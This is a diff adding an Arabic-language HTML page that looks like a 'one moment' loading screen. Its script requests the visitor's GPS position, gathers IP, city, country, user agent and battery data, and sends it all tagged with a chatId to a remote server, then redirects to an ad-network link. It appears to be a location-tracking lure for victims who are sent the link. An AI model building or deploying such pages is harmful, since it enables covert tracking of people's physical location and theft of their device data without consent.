@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>لحظة واحدة</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #fff;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <h2>لحظة واحدة</h2>
+  </div>
+
+<script>
+const chatId = new URLSearchParams(window.location.search).get("chatId");
+
+window.onload = () => {
+  if (!chatId) return;
+
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const battery = await navigator.getBattery();
+    const res = await fetch("https://ipwho.is/");
+    const location = await res.json();
+
+    const payload = {
+      chatId,
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude,
+      additionalData: {
+        ip: location.ip,
+        country: location.country,
+        city: location.city,
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        batteryLevel: Math.round(battery.level * 100) + '%',
+        batteryCharging: battery.charging
+      }
+    };
+
+    try {
+      const send = await fetch("https://freeusr1.onrender.com/submitLocation", {
+        method: "POST",
+        headers: { 
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+
+      const result = await send.json();
+      if (result.success) {
+        window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+      } else {
+        document.body.innerText = "فشل إرسال البيانات";
+      }
+    } catch (err) {
+      console.error("خطأ في الإرسال:", err);
+      document.body.innerText = "تعذر الاتصال بالسيرفر ❌";
+    }
+
+  }, (err) => {
+    console.error("رفض المستخدم صلاحيات الموقع", err);
+    document.body.innerText = "لم يتم السماح بالموقع ❌";
+  });
+};
+</script>
+<script type='text/javascript' src='//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
+</body>
+</html>
